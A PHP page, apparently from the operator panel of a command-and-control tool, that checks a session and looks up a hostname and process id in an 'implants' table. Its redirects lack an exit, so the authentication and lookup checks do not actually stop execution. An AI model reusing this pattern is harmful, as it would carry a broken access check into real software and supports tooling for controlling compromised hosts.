<?php
    # Necessary at the top of every page for session management
    session_start();

    include "connector.php";

    # If unauthenticated
    if (!isset($_SESSION["authenticated"])) {
        header("Location: 403.php");
    }

    $hostname = $_GET["h"];
    $process_id = $_GET["pid"];

    # Checks if the supplied "h" and "pid" values are valid and not fuzzed parameters
    # Redirects to "404.php" page if invalid or fuzzed parameters
    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->execute();
    $row_count = $statement->rowCount();
    $statement->connection = null;

    if ($row_count == "0") {
        header("Location: 404.php");
    }
?>